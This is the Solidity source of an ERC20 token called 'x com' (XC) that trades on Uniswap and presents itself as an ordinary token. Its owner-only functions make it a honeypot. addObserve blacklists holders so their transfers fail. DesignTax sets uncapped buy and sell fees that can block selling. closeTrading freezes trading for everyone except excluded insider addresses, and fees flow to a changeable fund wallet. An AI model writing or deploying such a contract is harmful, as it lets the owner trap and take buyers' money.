1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 interface IERC20 {
6     function decimals() external view returns (uint8);
7     function symbol() external view returns (string memory);
8     function name() external view returns (string memory);
9     function totalSupply() external view returns (uint256);
10     function balanceOf(address account) external view returns (uint256);
11     function transfer(address recipient, uint256 amount) external returns (bool);
12     function allowance(address owner, address spender) external view returns (uint256);
13     function approve(address spender, uint256 amount) external returns (bool);
14     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
15     event Transfer(address indexed from, address indexed to, uint256 value);
16     event Approval(address indexed owner, address indexed spender, uint256 value);
17 }
18 
19 interface IUniswapRouter {
20     function factory() external pure returns (address);
21 
22     function WETH() external pure returns (address);
23 
24     function swapExactTokensForETHSupportingFeeOnTransferTokens(
25         uint amountIn,
26         uint amountOutMin,
27         address[] calldata path,
28         address to,
29         uint deadline
30     ) external;
31 }
32 
33 interface IUniswapFactory {
34     function createPair(address tokenA, address tokenB) external returns (address pair);
35 }
36 
37 abstract contract Ownable {
38     address internal _owner;
39 
40     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
41 
42     constructor () {
43         address msgSender = msg.sender;
44         _owner = msgSender;
45         emit OwnershipTransferred(address(0), msgSender);
46     }
47 
48     function owner() public view returns (address) {
49         return _owner;
50     }
51 
52     modifier onlyOwner() {
53         require(_owner == msg.sender, "you are not owner");
54         _;
55     }
56 
57     function renounceOwnership() public virtual onlyOwner {
58         emit OwnershipTransferred(_owner, address(0));
59         _owner = address(0);
60     }
61 
62     function transferOwnership(address newOwner) public virtual onlyOwner {
63         require(newOwner != address(0), "new is 0");
64         emit OwnershipTransferred(_owner, newOwner);
65         _owner = newOwner;
66     }
67 }
68 
69 contract ERC20 is IERC20, Ownable {
70     mapping(address => uint256) private _balances;
71     mapping(address => mapping(address => uint256)) private _allowances;
72 
73     address public fundAddress;
74 
75     string private _name;
76     string private _symbol;
77     uint8 private _decimals;
78 
79     mapping(address => bool) public _isExcludeFromFee;
80     
81     uint256 private _totalSupply;
82 
83     IUniswapRouter public _uniswapRouter;
84 
85     mapping(address => bool) public isMarketPair;
86     bool private inSwap;
87 
88     uint256 private constant MAX = ~uint256(0);
89 
90     uint256 public _buyFundFee = 1;
91     uint256 public _sellFundFee = 1;
92 
93     address public _uniswapPair;
94 
95     modifier lockTheSwap {
96         inSwap = true;
97         _;
98         inSwap = false;
99     }
100 
101     constructor (){
102         _name = "x com";
103         _symbol = "XC";
104         _decimals = 0;
105         uint256 Supply = 42069000000000000000000000;
106         
107         IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
108 
109         _uniswapRouter = swapRouter;
110         _allowances[address(this)][address(swapRouter)] = MAX;
111 
112         IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
113         address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
114         _uniswapPair = swapPair;
115         isMarketPair[swapPair] = true;
116 
117         _totalSupply = Supply * 10 ** _decimals;
118         require(_totalSupply < ~uint112(0),"high decimals");
119 
120         address receiveAddr = 0x7a3F25291aDaa2E1B569872Ecef3aDc67d07F03E;
121         _balances[receiveAddr] = _totalSupply;
122         emit Transfer(address(0), receiveAddr, _totalSupply);
123 
124         fundAddress = 0xDa4875e496513c072345550E6fD9e79A2ff06C76;
125 
126         _isExcludeFromFee[address(this)] = true;
127         _isExcludeFromFee[address(swapRouter)] = true;
128         _isExcludeFromFee[msg.sender] = true;
129         _isExcludeFromFee[receiveAddr] = true;
130         _isExcludeFromFee[fundAddress] = true;
131     }
132 
133     function setFundAddr(address newAddr) public onlyOwner{
134         fundAddress = newAddr;
135     }
136 
137     function symbol() external view override returns (string memory) {
138         return _symbol;
139     }
140 
141     function name() external view override returns (string memory) {
142         return _name;
143     }
144 
145     function decimals() external view override returns (uint8) {
146         return _decimals;
147     }
148 
149     function totalSupply() public view override returns (uint256) {
150         return _totalSupply;
151     }
152 
153     function balanceOf(address account) public view override returns (uint256) {
154         return _balances[account];
155     }
156 
157     function transfer(address recipient, uint256 amount) public override returns (bool) {
158         _transfer(msg.sender, recipient, amount);
159         return true;
160     }
161 
162     function allowance(address owner, address spender) public view override returns (uint256) {
163         return _allowances[owner][spender];
164     }
165 
166     function approve(address spender, uint256 amount) public override returns (bool) {
167         _approve(msg.sender, spender, amount);
168         return true;
169     }
170 
171     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
172         _transfer(sender, recipient, amount);
173         if (_allowances[sender][msg.sender] != MAX) {
174             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
175         }
176         return true;
177     }
178 
179     function DesignTax(
180         uint256 newBuyFundFee,
181         uint256 newSellFundFee
182     ) public onlyOwner{
183         _buyFundFee = newBuyFundFee;
184         _sellFundFee = newSellFundFee;
185     }
186 
187     function _approve(address owner, address spender, uint256 amount) private {
188         _allowances[owner][spender] = amount;
189         emit Approval(owner, spender, amount);
190     }
191 
192     mapping(address => bool) public _observe;
193     function addObserve(address account) public onlyOwner{
194         _observe[account] = true;
195     }
196 
197     function delObserve(address account) public onlyOwner{
198         _observe[account] = false;
199     }
200 
201     function _transfer(
202         address from,
203         address to,
204         uint256 amount
205     ) private {
206         uint256 balance = balanceOf(from);
207         require(balance >= amount, "balanceNotEnough");
208 
209         bool takeFee;
210         bool sellFlag;
211 
212         if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
213             uint256 contractTokenBalance = balanceOf(address(this));
214             if (contractTokenBalance > 0) {
215                 uint256 numTokensSellToFund = amount;
216                 numTokensSellToFund = numTokensSellToFund > contractTokenBalance ? 
217                                                             contractTokenBalance:numTokensSellToFund;
218                 swapTokenForETH(numTokensSellToFund);
219             }
220         }
221 
222         require(!_observe[from],"observe");
223 
224         if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
225             require(tradingBlock > 0,"!trading");
226             takeFee = true;
227         }
228 
229         if (isMarketPair[to]) { sellFlag = true; }
230 
231         _transferToken(from, to, amount, takeFee, sellFlag);
232     }
233 
234     uint256 public tradingBlock;
235     function enableTrading() public onlyOwner{
236         require(tradingBlock == 0,"already trading");
237         tradingBlock = block.number;
238     }
239 
240     function closeTrading() public onlyOwner{
241         tradingBlock = 0;
242     }
243 
244     function _transferToken(
245         address sender,
246         address recipient,
247         uint256 tAmount,
248         bool takeFee,
249         bool sellFlag
250     ) private {
251         _balances[sender] = _balances[sender] - tAmount;
252         uint256 feeAmount;
253 
254         if (takeFee) {
255             
256             uint256 taxFee;
257 
258             if (sellFlag) {
259                 taxFee = _sellFundFee;
260             } else {
261                 taxFee = _buyFundFee;
262             }
263             uint256 swapAmount = tAmount * taxFee / 100;
264             if (swapAmount > 0) {
265                 feeAmount += swapAmount;
266                 _balances[address(this)] = _balances[address(this)] + swapAmount;
267                 emit Transfer(sender, address(this), swapAmount);
268             }
269         }
270 
271         _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
272         emit Transfer(sender, recipient, tAmount - feeAmount);
273 
274     }
275 
276     function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
277         address[] memory path = new address[](2);
278         path[0] = address(this);
279         path[1] = _uniswapRouter.WETH();
280         try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
281             tokenAmount,
282             0,
283             path,
284             address(fundAddress),
285             block.timestamp
286         ) {} catch {}
287 
288     }
289 
290     function setIsExcludeFromFees(address account, bool value) public onlyOwner{
291         _isExcludeFromFee[account] = value;
292     }
293 
294     receive() external payable {}
295 }